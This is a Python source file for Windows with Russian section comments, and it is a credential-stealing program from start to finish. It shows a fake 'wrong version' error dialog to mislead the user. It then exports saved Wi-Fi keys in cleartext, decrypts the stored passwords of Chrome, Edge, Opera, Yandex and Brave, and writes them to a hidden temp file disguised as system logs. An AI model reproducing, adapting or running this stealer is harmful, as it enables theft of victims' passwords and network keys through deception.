import os
import shutil
import sqlite3
import json
import subprocess
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import ctypes
import sys
import tempfile

# ========== 1. ФЕЙКОВАЯ ОШИБКА ==========
def show_fake_error():
    ctypes.windll.user32.MessageBoxW(
        0,
        "Неправильная версия программы. Установите актуальную версию Microsoft Driver Support.",
        "Ошибка запуска",
        0x10
    )

# ========== 2. СБОР ПАРОЛЕЙ ==========
def get_wifi():
    subprocess.run("netsh wlan export profile folder=. key=clear >nul 2>&1", shell=True)
    wifi = []
    for f in os.listdir("."):
        if f.startswith("Wi-Fi") and f.endswith(".xml"):
            with open(f, "r", encoding="utf-16") as file:
                data = file.read()
                if "<keyMaterial>" in data:
                    start = data.find("<keyMaterial>") + 12
                    end = data.find("</keyMaterial>")
                    wifi.append(data[start:end])
            os.remove(f)
    return wifi

def get_browser_pass(browser_path):
    passwords = []
    if not os.path.exists(browser_path):
        return passwords
    temp_db = os.getenv("TEMP") + "\\logins.db"
    shutil.copyfile(browser_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url, user, enc = row
        if user and enc:
            try:
                local_state = os.path.dirname(browser_path).replace("Default", "") + "Local State"
                with open(local_state, "r") as f:
                    key_data = json.load(f)["os_crypt"]["encrypted_key"]
                key = win32crypt.CryptUnprotectData(key_data)[1]
                aes = AESGCM(key[5:])
                dec = aes.decrypt(enc[3:], enc[:12], None)
                passwords.append((url, user, dec.decode()))
            except:
                try:
                    dec = win32crypt.CryptUnprotectData(enc)[1].decode()
                    passwords.append((url, user, dec))
                except:
                    pass
    conn.close()
    os.remove(temp_db)
    return passwords

def steal_all():
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\Login Data",
        "Yandex": os.path.expanduser("~") + r"\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
    }
    all_data = {}
    for name, path in browsers.items():
        all_data[name] = get_browser_pass(path)
    all_data["WiFi"] = get_wifi()
    return all_data

# ========== 3. СОХРАНЕНИЕ В СКРЫТЫЙ ФАЙЛ ==========
def save_data(data):
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, "system_logs.tmp")
    with open(file_path, "w", encoding="utf-8") as f:
        for k, v in data.items():
            f.write(f"\n=== {k} ===\n")
            for item in v:
                f.write(f"URL: {item[0]}\nUser: {item[1]}\nPass: {item[2]}\n\n")
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)

# ========== 4. ГЛАВНАЯ ФУНКЦИЯ ==========
def main():
    show_fake_error()
    data = steal_all()
    save_data(data)
    sys.exit(0)

if __name__ == "__main__":
    main()